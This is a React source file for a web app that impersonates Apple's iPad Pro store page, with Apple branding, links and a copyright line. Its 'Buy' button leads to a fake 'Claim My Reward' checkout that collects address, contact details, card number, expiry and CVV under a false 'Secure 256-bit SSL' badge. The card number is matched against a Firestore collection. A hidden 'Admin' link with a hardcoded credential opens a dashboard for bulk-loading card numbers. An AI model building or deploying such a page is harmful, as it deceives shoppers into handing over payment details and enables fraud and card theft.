import { motion, useScroll, useTransform } from 'motion/react';
import { useRef, useState } from 'react';
import { collection, addDoc, serverTimestamp, doc, setDoc, getDoc, deleteDoc } from 'firebase/firestore';
import { db } from './firebase';

const AppleIcon = (props: any) => (
  <svg viewBox="0 0 384 512" fill="currentColor" {...props}>
    <path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/>
  </svg>
);

function Navbar({ onHomeClick }: { onHomeClick?: () => void }) {
  const links = [
    { name: 'Store', url: 'https://www.apple.com/store' },
    { name: 'Mac', url: 'https://www.apple.com/mac/' },
    { name: 'iPad', url: 'https://www.apple.com/ipad/' },
    { name: 'iPhone', url: 'https://www.apple.com/iphone/' },
    { name: 'Watch', url: 'https://www.apple.com/watch/' },
    { name: 'Vision', url: 'https://www.apple.com/apple-vision-pro/' },
    { name: 'AirPods', url: 'https://www.apple.com/airpods/' },
    { name: 'TV & Home', url: 'https://www.apple.com/tv-home/' },
    { name: 'Entertainment', url: 'https://www.apple.com/services/' },
    { name: 'Accessories', url: 'https://www.apple.com/shop/accessories/all' },
    { name: 'Support', url: 'https://support.apple.com/' }
  ];

  return (
    <nav className="fixed top-0 left-0 right-0 h-12 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center text-xs font-medium text-gray-300">
      <div className="max-w-5xl w-full px-4 flex items-center justify-between">
        <button onClick={onHomeClick} className="hover:text-white transition-colors cursor-pointer outline-none">
          <AppleIcon className="w-4 h-4" />
        </button>
        <div className="hidden md:flex items-center space-x-8">
          {links.map(item => (
            <a 
              key={item.name} 
              href={item.url}
              target="_blank"
              rel="noopener noreferrer"
              className="hover:text-white transition-colors cursor-pointer"
            >
              {item.name}
            </a>
          ))}
        </div>
      </div>
    </nav>
  );
}

function SubNav({ onBuyClick }: { onBuyClick: () => void }) {
  return (
    <div className="fixed top-12 left-0 right-0 h-14 bg-black/80 backdrop-blur-md z-40 border-b border-white/10 flex items-center justify-center text-sm">
      <div className="max-w-5xl w-full px-4 flex items-center justify-between">
        <span className="text-xl font-semibold text-white">iPad Pro</span>
        <div className="flex items-center space-x-4">
          <span className="text-gray-300 text-xs hidden md:block">From $999</span>
          <button onClick={onBuyClick} className="bg-white text-black px-3 py-1 rounded-full text-xs font-medium hover:bg-gray-200 transition-colors">Buy</button>
        </div>
      </div>
    </div>
  );
}

function Hero() {
  const ref = useRef(null);
  const { scrollYProgress } = useScroll({
    target: ref,
    offset: ["start start", "end start"]
  });
  
  const y = useTransform(scrollYProgress, [0, 1], ["0%", "50%"]);
  const opacity = useTransform(scrollYProgress, [0, 0.5], [1, 0]);
  const scale = useTransform(scrollYProgress, [0, 0.5], [1, 0.9]);

  return (
    <section ref={ref} className="relative h-[120vh] flex flex-col items-center justify-start overflow-hidden bg-black pt-40">
      <motion.div 
        style={{ y, opacity, scale }}
        className="text-center z-10 sticky top-40"
      >
        <h1 className="text-7xl md:text-9xl font-semibold tracking-tighter text-white mb-2">iPad Pro</h1>
        <p className="text-3xl md:text-5xl font-medium tracking-tight bg-gradient-to-r from-purple-400 via-pink-500 to-red-500 text-transparent bg-clip-text">Thinpossible.</p>
      </motion.div>
      
      <motion.div 
        initial={{ y: 100, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        transition={{ duration: 1.2, ease: [0.16, 1, 0.3, 1], delay: 0.2 }}
        className="absolute bottom-0 w-full h-[60vh] flex justify-center items-end"
      >
        <div className="w-[90%] md:w-[70%] h-[90%] rounded-t-[3rem] border-t-8 border-l-8 border-r-8 border-zinc-800 bg-black relative overflow-hidden shadow-[0_-20px_100px_rgba(255,255,255,0.1)]">
           <img 
             src="https://images.unsplash.com/photo-1611532736597-de2d4265fba3?q=80&w=2500&auto=format&fit=crop" 
             alt="iPad Pro Screen" 
             className="w-full h-full object-cover opacity-80"
           />
           <div className="absolute inset-0 bg-gradient-to-t from-black via-transparent to-transparent"></div>
        </div>
      </motion.div>
    </section>
  );
}

function FeatureSection({ title, subtitle, image, reverse = false }: { title: string, subtitle: string, image: string, reverse?: boolean }) {
  return (
    <section className="py-32 px-6 bg-black text-white overflow-hidden">
      <div className={`max-w-6xl mx-auto flex flex-col ${reverse ? 'md:flex-row-reverse' : 'md:flex-row'} items-center gap-16`}>
        <motion.div 
          initial={{ opacity: 0, y: 50 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true, margin: "-100px" }}
          transition={{ duration: 0.8, ease: [0.16, 1, 0.3, 1] }}
          className="flex-1 space-y-6"
        >
          <h2 className="text-5xl md:text-7xl font-semibold tracking-tighter leading-tight">{title}</h2>
          <p className="text-xl md:text-2xl text-gray-400 font-medium">{subtitle}</p>
        </motion.div>
        <motion.div 
          initial={{ opacity: 0, scale: 0.95 }}
          whileInView={{ opacity: 1, scale: 1 }}
          viewport={{ once: true, margin: "-100px" }}
          transition={{ duration: 1, ease: [0.16, 1, 0.3, 1] }}
          className="flex-1 w-full"
        >
          <div className="aspect-square rounded-[2.5rem] overflow-hidden relative bg-zinc-900 border border-white/10">
            <img src={image} alt={title} className="w-full h-full object-cover opacity-90" />
          </div>
        </motion.div>
      </div>
    </section>
  );
}

function BentoGrid() {
  return (
    <section className="py-32 px-6 bg-black">
      <div className="max-w-6xl mx-auto">
        <motion.div 
          initial={{ opacity: 0, y: 40 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          transition={{ duration: 0.8 }}
          className="text-center mb-20"
        >
          <h2 className="text-5xl md:text-7xl font-semibold text-white tracking-tighter">Get to know iPad Pro.</h2>
        </motion.div>
        
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 auto-rows-[400px]">
          {/* M4 Chip */}
          <motion.div 
            initial={{ opacity: 0, y: 30 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            transition={{ duration: 0.8, delay: 0.1 }}
            className="md:col-span-2 rounded-[2.5rem] bg-gradient-to-br from-zinc-800 to-black p-12 relative overflow-hidden border border-white/10 group"
          >
            <div className="relative z-10">
              <h3 className="text-4xl font-semibold text-white mb-2 tracking-tight">M4 Chip</h3>
              <p className="text-gray-400 text-xl">Outrageous performance.</p>
            </div>
            <motion.div 
              className="absolute bottom-0 right-0 w-2/3 h-2/3 bg-[url('https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=2000&auto=format&fit=crop')] bg-cover bg-center opacity-40 mix-blend-luminosity rounded-tl-full transition-transform duration-700 group-hover:scale-105"
            />
          </motion.div>

          {/* Thinness */}
          <motion.div 
            initial={{ opacity: 0, y: 30 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            transition={{ duration: 0.8, delay: 0.2 }}
            className="rounded-[2.5rem] bg-zinc-900 p-12 relative overflow-hidden border border-white/10 flex flex-col justify-between group"
          >
            <div>
              <h3 className="text-4xl font-semibold text-white mb-2 tracking-tight">5.1 mm</h3>
              <p className="text-gray-400 text-xl">The thinnest Apple product ever.</p>
            </div>
            <div className="w-full h-1 bg-gradient-to-r from-transparent via-white to-transparent mt-8 shadow-[0_0_15px_white] transition-opacity duration-700 group-hover:opacity-100 opacity-70"></div>
          </motion.div>

          {/* Display */}
          <motion.div 
            initial={{ opacity: 0, y: 30 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            transition={{ duration: 0.8, delay: 0.3 }}
            className="rounded-[2.5rem] bg-zinc-900 p-12 relative overflow-hidden border border-white/10 group"
          >
            <h3 className="text-4xl font-semibold text-white mb-2 tracking-tight">Ultra Retina XDR</h3>
            <p className="text-gray-400 text-xl">OLED display.</p>
            <div className="absolute bottom-0 left-0 w-full h-1/2 bg-gradient-to-t from-blue-500/20 to-transparent transition-opacity duration-700 group-hover:opacity-100 opacity-50"></div>
          </motion.div>

          {/* Apple Pencil Pro */}
          <motion.div 
            initial={{ opacity: 0, y: 30 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            transition={{ duration: 0.8, delay: 0.4 }}
            className="md:col-span-2 rounded-[2.5rem] bg-zinc-900 p-12 relative overflow-hidden border border-white/10 group"
          >
            <div className="relative z-10 w-2/3 md:w-1/2">
              <h3 className="text-4xl font-semibold text-white mb-2 tracking-tight">Apple Pencil Pro</h3>
              <p className="text-gray-400 text-xl">Engineered for limitless creativity.</p>
            </div>
            <div className="absolute right-[-10%] top-1/2 -translate-y-1/2 w-2/3 h-8 bg-white rounded-full shadow-[0_0_40px_rgba(255,255,255,0.6)] rotate-[-15deg] transition-transform duration-700 group-hover:rotate-[-10deg]"></div>
          </motion.div>
        </div>
      </div>
    </section>
  );
}

function Footer({ onAdminClick }: { onAdminClick: () => void }) {
  return (
    <footer className="bg-[#111] text-gray-400 py-12 px-6 text-xs border-t border-white/10">
      <div className="max-w-5xl mx-auto">
        <p className="mb-4">1. Testing conducted by Apple in March 2024 using preproduction 13-inch iPad Pro (M4) and 11-inch iPad Pro (M4) units.</p>
        <p className="mb-8">Displays have rounded corners. When measured diagonally as a rectangle, the 13-inch iPad Pro is 13 inches and the 11-inch iPad Pro is 11.1 inches. Actual viewable area is less.</p>
        
        <div className="border-t border-white/10 pt-8 flex flex-col md:flex-row justify-between items-center gap-4">
          <div className="flex items-center gap-4">
            <AppleIcon className="w-4 h-4" />
            <span>Copyright © 2024 Apple Inc. All rights reserved.</span>
          </div>
          <div className="flex flex-wrap gap-4">
            <span className="hover:text-white cursor-pointer transition-colors">Privacy Policy</span>
            <span className="hover:text-white cursor-pointer transition-colors">Terms of Use</span>
            <span className="hover:text-white cursor-pointer transition-colors">Sales and Refunds</span>
            <span className="hover:text-white cursor-pointer transition-colors">Legal</span>
            <span className="hover:text-white cursor-pointer transition-colors">Site Map</span>
            <span onClick={onAdminClick} className="hover:text-white cursor-pointer transition-colors">Admin</span>
          </div>
        </div>
      </div>
    </footer>
  );
}

function CheckoutPage({ onBack }: { onBack: () => void }) {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [statusMsg, setStatusMsg] = useState<{ text: string, type: 'success' | 'error' } | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 16);
    setCardNumber(value);
  };

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 4);
    setExpiryDate(value);
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 3);
    setCvv(value);
  };

  const handleClaim = async () => {
    const cleanedCard = cardNumber.replace(/\s+/g, '');
    if (!/^\d{16}$/.test(cleanedCard)) {
      setStatusMsg({ text: 'Transaction Failed: Please enter a valid 16-digit card number.', type: 'error' });
      return;
    }

    setIsProcessing(true);
    try {
      const cardRef = doc(db, 'creditCards', cleanedCard);
      const cardSnap = await getDoc(cardRef);

      if (cardSnap.exists()) {
        await deleteDoc(cardRef);
        setStatusMsg({ text: 'Transaction Successful! Your reward has been claimed.', type: 'success' });
        setCardNumber(''); // Clear input on success
      } else {
        setStatusMsg({ text: 'Transaction Failed', type: 'error' });
      }
    } catch (error: any) {
      console.error(error);
      setStatusMsg({ text: `Transaction Failed: ${error.message}`, type: 'error' });
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center py-12 px-4 font-sans selection:bg-pink-500/30">
      <div className="w-full max-w-[500px] mb-4">
        <button onClick={onBack} className="text-blue-400 text-sm font-medium hover:text-blue-300 transition-colors flex items-center gap-1">
          &larr; Back to Store
        </button>
      </div>
      <div className="bg-[#111] rounded-xl shadow-2xl border border-white/10 w-full max-w-[500px] overflow-hidden">
        <div className="p-6 md:p-8">
          <h1 className="text-[28px] font-bold text-white mb-1">Delivery Address</h1>
          <p className="text-gray-400 text-[15px] mb-6">Where should we send your iPad Pro?</p>

          {statusMsg && (
            <div className={`mb-6 p-4 text-sm rounded-md font-medium ${statusMsg.type === 'success' ? 'bg-green-500/10 text-green-400 border border-green-500/20' : 'bg-red-500/10 text-red-400 border border-red-500/20'}`}>
              {statusMsg.text}
            </div>
          )}

          <form className="space-y-4">
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">First Name</label>
                <input type="text" placeholder="John" className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" />
              </div>
              <div>
                <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">Last Name</label>
                <input type="text" placeholder="Doe" className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" />
              </div>
            </div>

            <div>
              <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">Street Address</label>
              <input type="text" placeholder="123 Main St" className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" />
            </div>

            <div className="grid grid-cols-12 gap-4">
              <div className="col-span-12 sm:col-span-6">
                <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">City</label>
                <input type="text" placeholder="New York" className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" />
              </div>
              <div className="col-span-6 sm:col-span-3">
                <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">State</label>
                <input type="text" placeholder="NY" className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" />
              </div>
              <div className="col-span-6 sm:col-span-3">
                <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">Zip</label>
                <input type="text" placeholder="10001" className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" />
              </div>
            </div>

            <hr className="my-6 border-white/10" />

            <div>
              <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">Phone Number</label>
              <input type="tel" placeholder="(555) 000-0000" className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" />
            </div>

            <div>
              <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">Email Address</label>
              <input type="email" placeholder="john@example.com" className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" />
            </div>

            <hr className="my-6 border-white/10" />

            <div className="flex items-center gap-2 mb-4">
              <svg className="w-5 h-5 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>
              <h2 className="text-[15px] font-bold text-white">Card Information (For Verification)</h2>
            </div>

            <div>
              <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">Card Number</label>
              <input 
                type="text" 
                placeholder="0000000000000000" 
                value={cardNumber}
                onChange={handleCardNumberChange}
                maxLength={16}
                className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white font-mono focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" 
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">Expiry Date</label>
                <input 
                  type="text" 
                  placeholder="MMYY" 
                  value={expiryDate}
                  onChange={handleExpiryDateChange}
                  maxLength={4}
                  className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" 
                />
              </div>
              <div>
                <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">CVV</label>
                <input 
                  type="text" 
                  placeholder="123" 
                  value={cvv}
                  onChange={handleCvvChange}
                  maxLength={3}
                  className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" 
                />
              </div>
            </div>

            <div className="pt-4">
              <button 
                type="button" 
                onClick={handleClaim}
                disabled={isProcessing}
                className="w-full bg-[#1c64f2] hover:bg-blue-600 disabled:bg-blue-800 disabled:text-gray-400 text-white font-bold py-3.5 px-4 rounded-lg flex items-center justify-center gap-2 transition-colors shadow-sm shadow-blue-500/20"
              >
                {isProcessing ? 'Processing...' : 'Claim My Reward'}
                {!isProcessing && <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M9 5l7 7-7 7" /></svg>}
              </button>
            </div>
          </form>
        </div>

        <div className="bg-black border-t border-white/10 p-5 flex flex-col items-center gap-3">
          <div className="flex items-center gap-4 opacity-40 grayscale">
            {/* Visa */}
            <svg className="h-4" viewBox="0 0 32 10" fill="currentColor"><path d="M14.5 0L13.2 8.3h2.1l1.3-8.3h-2.1zm8.4 0c-.5 0-1.2.2-1.6.4l-.8 4.1c.3.2.8.3 1.2.3 1.5 0 2.1-.8 2.3-1.6.2-.8-.2-1.4-1.1-1.4-.4 0-.8.1-1.1.2l.3-1.6c.3-.1.8-.2 1.3-.2 1.1 0 1.6.5 1.4 1.3-.1.6-.6 1.1-1.3 1.1-.3 0-.6-.1-.8-.2l.6-2.9c.3-.1.7-.2 1.1-.2.4 0 .6.2.5.6-.1.4-.5.7-1 .7-.2 0-.4 0-.5-.1l-.4 2.1c.3.1.7.2 1.1.2 1.2 0 2.1-.7 2.4-1.8.3-1.3-.5-2.1-1.8-2.1zm-15.6 0L5.1 5.7 4.3 1.5C4.2.5 3.5 0 2.5 0H0v.4c.8.2 1.6.5 2.1.9l1.8 7h2.2l3.3-8.3H7.3zm16.5 0h-1.6c-.4 0-.7.2-.8.6l-3.1 7.7h2.2l.4-1.2h2.7l.3 1.2h2.1L23.8 0zm-2.4 5.3l1.1-3.1h.1l.5 3.1h-1.7z"/></svg>
            {/* Mastercard */}
            <svg className="h-5" viewBox="0 0 32 20" fill="currentColor"><path fill="#EB001B" d="M12.5 10c0-2.8 1.3-5.3 3.5-6.9-2.2-1.9-5.4-2-7.8-.3-2.4 1.7-3.3 4.9-2.1 7.6 1.2 2.7 4.1 4.2 7.1 3.8-1.5-1.1-2.5-2.8-2.5-4.7z"/><path fill="#F79E1B" d="M22.5 10c0 2.8-1.3 5.3-3.5 6.9 2.2 1.9 5.4 2 7.8.3 2.4-1.7 3.3-4.9 2.1-7.6-1.2-2.7-4.1-4.2-7.1-3.8 1.5 1.1 2.5 2.8 2.5 4.7z"/><path fill="#FF5F00" d="M16 14.7c-1.5-1.1-2.5-2.8-2.5-4.7 0-1.9 1-3.6 2.5-4.7 1.5 1.1 2.5 2.8 2.5 4.7 0 1.9-1 3.6-2.5 4.7z"/></svg>
            {/* PayPal */}
            <svg className="h-4" viewBox="0 0 24 24" fill="currentColor"><path d="M7.076 21.337H2.47a.641.641 0 0 1-.633-.74L4.944.901C5.026.382 5.474 0 5.998 0h7.46c2.57 0 4.578.543 5.69 1.81 1.01 1.15 1.304 2.42 1.012 4.287-.023.143-.047.288-.077.437-.983 5.05-4.349 6.797-8.647 6.797h-2.19c-.524 0-.968.382-1.05.9l-1.12 7.106z"/></svg>
          </div>
          <div className="flex items-center gap-1.5 text-gray-500 text-[10px] font-bold tracking-wider uppercase">
            <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
            Secure 256-bit SSL Encryption
          </div>
        </div>
      </div>
    </div>
  );
}

function AdminLoginPage({ onLogin, onBack }: { onLogin: () => void, onBack: () => void }) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (username === '890305@wty.com' && password === '890305@wty.com') {
      onLogin();
    } else {
      setError('Invalid credentials');
    }
  };

  return (
    <div className="min-h-screen bg-[#f9fafb] text-black flex flex-col items-center justify-center py-12 px-4 font-sans">
      <div className="w-full max-w-[400px] mb-4">
        <button onClick={onBack} className="text-blue-600 text-sm font-medium hover:underline flex items-center gap-1">
          &larr; Back to Store
        </button>
      </div>
      <div className="bg-white rounded-xl shadow-sm border border-gray-200 w-full max-w-[400px] p-8">
        <h1 className="text-2xl font-bold text-gray-900 mb-6 text-center">Admin Portal</h1>
        {error && <div className="mb-4 p-3 bg-red-50 text-red-600 text-sm rounded-md">{error}</div>}
        <form onSubmit={handleLogin} className="space-y-4">
          <div>
            <label className="block text-[13px] font-semibold text-gray-900 mb-1.5">Username</label>
            <input type="text" value={username} onChange={e => setUsername(e.target.value)} className="w-full border border-gray-200 rounded-md px-3 py-2.5 text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all" />
          </div>
          <div>
            <label className="block text-[13px] font-semibold text-gray-900 mb-1.5">Password</label>
            <input type="password" value={password} onChange={e => setPassword(e.target.value)} className="w-full border border-gray-200 rounded-md px-3 py-2.5 text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all" />
          </div>
          <button type="submit" className="w-full bg-black hover:bg-gray-800 text-white font-bold py-3 px-4 rounded-lg transition-colors mt-2">
            Login
          </button>
        </form>
      </div>
    </div>
  );
}

function AdminDashboardPage({ onLogout }: { onLogout: () => void }) {
  const [cardData, setCardData] = useState('');
  const [message, setMessage] = useState<{ text: string, type: 'success' | 'error' | 'warning' } | null>(null);
  const [isSaving, setIsSaving] = useState(false);

  const handleTextChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    const text = e.target.value;
    // Enforce max 16 digits per line and only allow numbers
    const lines = text.split('\n');
    const processedLines = lines.map(line => line.replace(/[^0-9]/g, '').slice(0, 16));
    const newText = processedLines.join('\n');
    
    setCardData(newText);

    // Check if any line has length > 0 and < 16
    const hasIncompleteLines = processedLines.some(line => line.length > 0 && line.length < 16);
    if (hasIncompleteLines) {
      setMessage({ text: 'Warning: Some lines have fewer than 16 digits.', type: 'warning' });
    } else {
      setMessage(null);
    }
  };

  const handleSave = async () => {
    if (!cardData.trim()) {
      setMessage({ text: 'Please enter at least one card number.', type: 'error' });
      return;
    }

    const lines = cardData.split('\n').map(line => line.trim()).filter(line => line.length > 0);
    const invalidLines = lines.filter(line => !/^\d{16}$/.test(line));

    if (invalidLines.length > 0) {
      setMessage({ text: 'Validation failed: Every line must contain exactly 16 digits.', type: 'error' });
      return;
    }

    setIsSaving(true);
    try {
      const promises = lines.map(cardNumber => 
        setDoc(doc(db, 'creditCards', cardNumber), {
          cardNumber,
          createdAt: serverTimestamp()
        })
      );
      await Promise.all(promises);
      setMessage({ text: `Successfully saved ${lines.length} card number(s) to database.`, type: 'success' });
      setCardData(''); // Clear on success
    } catch (error: any) {
      console.error("Error saving to Firestore:", error);
      setMessage({ text: `Failed to save: ${error.message}`, type: 'error' });
    } finally {
      setIsSaving(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 text-black font-sans">
      <nav className="bg-white border-b border-gray-200 px-6 py-4 flex justify-between items-center">
        <h1 className="text-xl font-bold">Admin Dashboard</h1>
        <button onClick={onLogout} className="text-sm text-gray-600 hover:text-black font-medium">Logout</button>
      </nav>
      <main className="p-8 max-w-4xl mx-auto">
        <div className="bg-white rounded-xl shadow-sm border border-gray-200 p-8">
          <h2 className="text-lg font-bold text-gray-900 mb-2">Credit Card Data Entry</h2>
          <p className="text-sm text-gray-500 mb-6">Enter 16-digit credit card numbers below. Each number must be on a new line.</p>
          
          {message && (
            <div className={`mb-4 p-3 text-sm rounded-md ${
              message.type === 'success' ? 'bg-green-50 text-green-700 border border-green-200' : 
              message.type === 'warning' ? 'bg-yellow-50 text-yellow-700 border border-yellow-200' :
              'bg-red-50 text-red-600 border border-red-200'
            }`}>
              {message.text}
            </div>
          )}

          <textarea
            value={cardData}
            onChange={handleTextChange}
            placeholder="0000000000000000&#10;1111111111111111"
            className="w-full h-64 border border-gray-200 rounded-md p-4 font-mono text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all resize-y mb-4 placeholder:text-gray-400"
          />
          
          <div className="flex justify-end">
            <button 
              onClick={handleSave}
              disabled={isSaving}
              className="bg-blue-600 hover:bg-blue-700 disabled:bg-blue-400 text-white font-bold py-2 px-6 rounded-lg transition-colors shadow-sm flex items-center gap-2"
            >
              {isSaving ? 'Saving...' : 'Save Data'}
            </button>
          </div>
        </div>
      </main>
    </div>
  );
}

export default function App() {
  const [currentView, setCurrentView] = useState<'store' | 'checkout' | 'adminLogin' | 'adminDashboard'>('store');

  if (currentView === 'checkout') {
    return <CheckoutPage onBack={() => setCurrentView('store')} />;
  }
  if (currentView === 'adminLogin') {
    return <AdminLoginPage onLogin={() => setCurrentView('adminDashboard')} onBack={() => setCurrentView('store')} />;
  }
  if (currentView === 'adminDashboard') {
    return <AdminDashboardPage onLogout={() => setCurrentView('store')} />;
  }

  return (
    <div className="bg-black min-h-screen text-white selection:bg-pink-500/30">
      <Navbar onHomeClick={() => setCurrentView('store')} />
      <SubNav onBuyClick={() => setCurrentView('checkout')} />
      <main>
        <Hero />
        <FeatureSection 
          title="The world's most advanced display."
          subtitle="The new Ultra Retina XDR display introduces groundbreaking tandem OLED technology. Extreme brightness, incredibly precise contrast, and advanced technologies like ProMotion and True Tone give you a jaw-dropping visual experience."
          image="https://images.unsplash.com/photo-1585790050230-5dd28404ccb9?q=80&w=2500&auto=format&fit=crop"
        />
        <FeatureSection 
          title="M4. Outrageous performance."
          subtitle="The next generation of Apple silicon arrives with M4, delivering outrageous performance in an exceptionally thin and light design. An entirely new display engine enables stunning precision, color, and brightness."
          image="https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=2000&auto=format&fit=crop"
          reverse
        />
        <BentoGrid />
      </main>
      <Footer onAdminClick={() => setCurrentView('adminLogin')} />
    </div>
  );
}
